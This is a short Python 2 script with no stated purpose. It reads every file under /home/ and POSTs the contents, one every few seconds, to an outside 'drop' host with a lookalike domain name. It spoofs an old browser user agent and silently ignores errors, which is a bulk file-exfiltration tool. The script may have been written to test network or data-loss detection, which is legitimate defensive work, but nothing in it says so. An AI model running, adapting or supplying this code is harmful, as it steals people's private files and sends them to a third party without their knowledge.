#!/usr/bin/env python2

import httplib
import os
import time

user_agent_string = 'Mozilla/4.0 (compatable; MSIE 6.0; Windows NT 5.1; SV1'
destination = 'current.drop.azsure.goggl.come'
path = '/'#'/aa/0301/2019/01/'

connection = httplib.HTTPConnection(destination)

headers = {
	"Content-type": "application/x-ww-form-urlendoded",
	"Accept": "test/plain",
	"User-Agent": user_agent_string,
	}


def main():
    
    i = 0
    for subdir, dirs, files in os.walk('/home/'):
        for file_name in files:
	    try:
	        i += 1
	        time.sleep(3)
                file_path = subdir + os.sep + file_name
	        handle = open(file_path)
	        contents = handle.read()
	        handle.close()

	        final_path = path + str(i)
	        connection.request('POST', path, contents, headers)
	        connection.getresponse().read()
	    except:
		pass




if __name__ == '__main__':
    main()


